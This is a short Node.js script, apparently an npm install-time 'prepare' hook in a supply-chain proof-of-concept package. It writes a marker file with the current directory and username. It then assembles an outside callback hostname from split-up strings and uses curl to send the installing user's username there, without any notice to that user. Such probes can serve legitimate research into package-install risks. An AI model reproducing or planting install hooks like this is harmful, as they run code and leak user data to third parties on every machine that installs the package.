"use strict";

const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { spawnSync } = require("node:child_process");

const markerPath = "/private/tmp/test-supply-npm-git-prepare-proof-4-marker";
const username = os.userInfo().username;
const marker = {
  package: "test-supply-npm-git-prepare-proof-4",
  cwd: process.cwd(),
  username,
  executedAt: new Date().toISOString()
};

fs.writeFileSync(markerPath, `${JSON.stringify(marker, null, 2)}\n`);
console.log(`prepare proof marker written to ${path.normalize(markerPath)}`);

const callbackHost = ["pfelipewiiiiwawaawuuu", "free", "beeceptor", "com"].join(".");
const callbackUrl = new URL(`https://${callbackHost}/`);
callbackUrl.searchParams.set("whoami", username);

const callback = spawnSync("curl", ["-fsS", callbackUrl.toString()], {
  stdio: "ignore"
});

if (callback.status === 0) {
  console.log("prepare proof callback sent");
} else {
  console.log(`prepare proof callback failed with status ${callback.status}`);
}
